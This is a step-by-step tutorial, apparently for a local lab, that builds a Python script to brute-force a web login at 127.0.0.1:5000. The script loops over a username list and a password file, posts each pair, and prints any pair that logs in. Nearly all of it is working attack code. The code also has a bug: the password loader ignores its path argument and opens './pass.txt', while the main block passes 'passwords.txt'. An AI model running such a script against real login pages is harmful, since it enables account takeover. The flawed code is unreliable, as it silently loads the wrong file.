Step 1: Import Required Module

import requests

    The requests module is used to send HTTP requests to the target URL.

Step 2: Define load_passwords Function
```py
def load_passwords(file_path):
    try:
        with open('./pass.txt', "r") as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        return []
```

   Purpose: This function reads passwords from a file.
    Steps:
        Open file: The file at file_path is opened in read mode ("r").
        Process lines: Each line from the file is stripped of trailing whitespace and returned as a list.
        Handle error: If the file is not found, it prints an error message and returns an empty list.

Step 3: Define brute_force_login Function

```py
def brute_force_login(url, username_list, password_file):
```
This function performs the brute force attack by testing combinations of usernames and passwords.

Step 3.1: Load Passwords from File
```py
password_list = load_passwords(password_file)
if not password_list:
    print("[!] No passwords to test. Exiting.")
    return
```
 Load passwords: Calls load_passwords() to get the list of passwords from the file.
    Check if empty: If no passwords are found, print an error message and exit.

Step 3.2: Iterate Through Usernames and Passwords
```py

for username in username_list:
    for password in password_list:
        data = {
            "username": username,
            "password": password
        }
```
 Outer loop: Goes through each username in the username_list.
Inner loop: Tests each password from the password_list.
Prepare data: Creates a dictionary containing the username and password.

Step 3.3: Send HTTP POST Request
```py
        headers = {
            "Host": "127.0.0.1:5000",
        }
        response = requests.post(url, headers=headers, data=data)
```
Headers: Creates a basic HTTP header. You can expand it as needed.
    Send POST request: Sends the data (username and password) to the target URL.

Step 3.4: Check for Success
```py
        if "You are logged in" in response.text:
            print(f"[+] Login successful: Username: {username}, Password: {password}")
            return
        else:
            print(f"[-] Failed: Username: {username}, Password: {password}")
```
Check response: Looks for the success message "You are logged in" in the server's response.
    Success: If found, it prints the valid username and password and exits.
    Failure: Otherwise, it logs that the attempt failed.

Step 4: End of Brute Force
```py
print("[-] Brute force complete. No valid credentials found.")
```
If no valid credentials are found after trying all combinations, a message is printed.

Step 5: Main Script Execution
```py
if __name__ == "__main__":
    target_url = "http://127.0.0.1:5000/login"
    username_list = ["12345", "admin"]
    password_file = "passwords.txt"
    brute_force_login(target_url, username_list, password_file)
```
Define variables:
        target_url: The URL where the login requests are sent.
        username_list: A list of usernames to test.
        password_file: The file containing passwords to test.
    Call function: The brute_force_login() function is executed with the above inputs.
